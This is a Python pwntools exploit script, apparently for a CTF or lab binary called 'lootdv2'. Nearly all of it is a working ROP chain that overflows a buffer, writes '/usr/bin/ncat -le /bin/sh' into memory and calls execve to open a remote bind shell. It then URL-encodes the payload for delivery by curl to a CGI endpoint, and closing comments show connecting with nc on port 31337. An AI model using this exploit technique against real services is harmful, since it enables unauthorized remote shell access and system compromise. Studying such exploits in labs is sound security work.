from pwn import *
import urllib
 
elf = context.binary = ELF('./lootdv2', checksec=False)
rop = ROP(elf)
p = process()
 
#writeable memory locations
argv_location = 0x0040e000
argv_pointer_array_location = 0x0040f000
 
#get gadgets and functions from the elf
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
pop_rsi = (rop.find_gadget(['pop rsi', 'ret']))[0]
pop_rbx = (rop.find_gadget(['pop rbx', 'ret']))[0]
pop_rdx = (rop.find_gadget(['pop rdx', 'ret']))[0]
execve = elf.sym['execve']
ebx_to_rsi = 0x406c59 # mov [rsi - 0x31], ebx; ret
 
#padding
payload = b'A' * (8 * 21)
 
#zero out rbx
payload += p64(pop_rbx)
payload += p64(0x0)
 
#load filepath into writeable memory
payload += p64(pop_rsi)
payload += p64(argv_location + 0x31)
payload += p64(pop_rbx)
payload += b'/usr\00\00\00\00'
payload += p64(ebx_to_rsi) 
payload += p64(pop_rsi)
payload += p64(argv_location + 0x31 + 0x4)
payload += p64(pop_rbx)
payload += b'/bin\00\00\00\00'
payload += p64(ebx_to_rsi)
payload += p64(pop_rsi)
payload += p64(argv_location + 0x31 + 0x8)
payload += p64(pop_rbx)
payload += b'/nca\00\00\00\00'
payload += p64(ebx_to_rsi)
payload += p64(pop_rsi)
payload += p64(argv_location + 0x31 + 0xc)
payload += p64(pop_rbx)
payload += b't\00\00\00\00\00\00\00'
payload += p64(ebx_to_rsi)
 
#load arguments into writeable memory
payload += p64(pop_rsi)
payload += p64(argv_location + 0x31 + 0xe)
payload += p64(pop_rbx)
payload += b'-le\00\00\00\00\00'
payload += p64(ebx_to_rsi)
payload += p64(pop_rsi)
payload += p64(argv_location + 0x31 + 0x12)
payload += p64(pop_rbx)
payload += b'/bin\00\00\00\00'
payload += p64(ebx_to_rsi)
payload += p64(pop_rsi)
payload += p64(argv_location + 0x31 + 0x16)
payload += p64(pop_rbx)
payload += b'/sh\00\00\00\00\00'
payload += p64(ebx_to_rsi)
 
#write pointers to arguments into memory
#argv[0]
payload += p64(pop_rsi)
payload += p64(argv_pointer_array_location + 0x31)
payload += p64(pop_rbx)
payload += p64(argv_location)
payload += p64(ebx_to_rsi)
payload += p64(pop_rsi)
payload += p64(argv_pointer_array_location + 0x31 + 0x4)
payload += p64(pop_rbx)
payload += p64(0x0)
payload += p64(ebx_to_rsi)
 
#argv[1]
payload += p64(pop_rsi)
payload += p64(argv_pointer_array_location + 0x31 + 0x8)
payload += p64(pop_rbx)
payload += p64(argv_location + 0xe)
payload += p64(ebx_to_rsi)
payload += p64(pop_rsi)
payload += p64(argv_pointer_array_location + 0x31 + 0xc)
payload += p64(pop_rbx)
payload += p64(0x0)
payload += p64(ebx_to_rsi)
 
#argv[2]
payload += p64(pop_rsi)
payload += p64(argv_pointer_array_location + 0x31 + 0x10)
payload += p64(pop_rbx)
payload += p64(argv_location + 0x12)
payload += p64(ebx_to_rsi)
payload += p64(pop_rsi)
payload += p64(argv_pointer_array_location + 0x31 + 0x14)
payload += p64(pop_rbx)
payload += p64(0x0)
payload += p64(ebx_to_rsi)
 
#call execve with arguments
payload += p64(pop_rdi)
payload += p64(argv_location)
payload += p64(pop_rsi)
payload += p64(argv_pointer_array_location)
payload += p64(pop_rdx)
payload += p64(0x0)
payload += p64(execve)
 
#url-encode payload
payload = urllib.parse.quote(payload)
 
print(payload)
 
#curl http://anvilshop.utl/cgi-bin/lootd.v2/download?<payload>
#nc anvilshop.utl 31337